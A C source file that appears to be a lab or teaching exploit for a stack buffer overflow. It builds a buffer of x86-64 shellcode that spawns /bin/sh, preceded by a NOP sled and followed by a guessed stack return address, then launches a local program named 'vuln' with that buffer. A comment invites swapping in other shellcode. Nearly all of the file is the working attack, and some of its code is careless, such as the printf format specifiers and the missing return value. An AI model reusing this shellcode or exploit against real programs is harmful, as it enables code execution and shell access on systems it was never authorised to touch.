#include <stdio.h>
#include <string.h>
#include <unistd.h>

//NOP sled to give a bigger margin of error
char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x11"
"\x48\xc1\xe7\x08"
"\x48\xc1\xef\x08"
"\x57"
"\x48\x89\xe7"
"\x48\x31\xc0"
"\x48\x31\xf6"
"\x48\x31\xd2"
"\xb0\x3b"
"\x0f\x05"
"\x00";

//Replace the above NOP buffer with your shell code.

unsigned long get_sp(void) { 
	__asm__("movq %rsp,%rax"); 
} 

void main(int argc, char *argv[]) 
{ 
	int bsize=0, offset=0,i=0,j=0;
	char *buff, *ptr;
	long long *addr,*addr_ptr;
	if (argc == 1)
	{
		printf("\n\nUsage is either attack [buffer_size]\n or attack [buffer_size] [stack_offset]\n");
		exit(0);
	}
	if (argc > 1) bsize = atoi(argv[1]); 
	if (argc > 2) offset = atoi(argv[2]);
	
	printf("Before malloc, SP is : 0x%x\n", get_sp()); 
	buff = malloc(bsize); 
	addr = get_sp() -offset;
	printf("After malloc, SP is : 0x%x\n", get_sp());
	printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
	ptr = buff; 
	addr_ptr = (long long *) ptr; 

	for (i = 0; i < bsize-8; i+=8) 
		*(addr_ptr++) = 0xFFFFFFFFFFFFFFFF; 
	*(addr_ptr)=addr;

	for (i = 0; i < strlen(shellcode); i++) 
		*(ptr++) = shellcode[i]; 

	buff[bsize - 1] = (char*)NULL; 

	printf("Starting vulnerable program\n");      
	execl("./vuln","./vuln", buff, NULL);
	return;
}
